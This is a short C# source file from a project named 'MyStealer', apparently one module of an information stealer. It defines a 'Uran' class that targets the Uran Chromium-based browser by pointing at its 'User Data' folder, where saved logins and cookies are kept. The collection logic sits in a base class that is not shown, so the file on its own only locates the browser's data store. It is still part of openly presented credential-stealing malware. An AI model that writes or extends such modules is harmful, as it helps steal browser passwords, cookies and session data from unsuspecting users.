using System.IO;
using System;
using MyStealer.Collector.Modules.Browser;

namespace MyStealer.Collector.Modules.Browser.ChromiumBased
{
    public class Uran : Chromium
    {
        public override string ModuleName => "Uran";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "uCozMedia", "Uran", "User Data");
    }
}
